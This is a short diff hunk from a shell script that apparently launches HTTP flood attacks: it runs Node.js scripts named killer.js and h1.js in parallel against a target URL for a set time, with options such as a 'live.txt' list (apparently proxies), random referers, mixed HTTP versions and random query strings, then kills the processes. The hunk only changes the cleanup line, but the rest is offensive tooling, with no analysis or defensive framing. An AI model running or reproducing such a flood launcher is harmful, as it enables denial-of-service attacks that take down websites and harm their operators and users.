@@ -20,4 +20,4 @@ node killer.js GET $URL $TIME 1 1 live.txt --query 1 --referer rand --http mix -
 node h1.js POST $URL live.txt $TIME 999 10 randomstring=true &
 node h1.js GET $URL live.txt $TIME 999 10 randomstring=true &
 wait
-pkill -f "hmix.js|h1.js|h2.js|killer.js|http1.js|http2.js"
+pgrep -f "hmix.js|h1.js|h1h2.js|http2.js|h1version.js|killer.js" | xargs -r kill -9
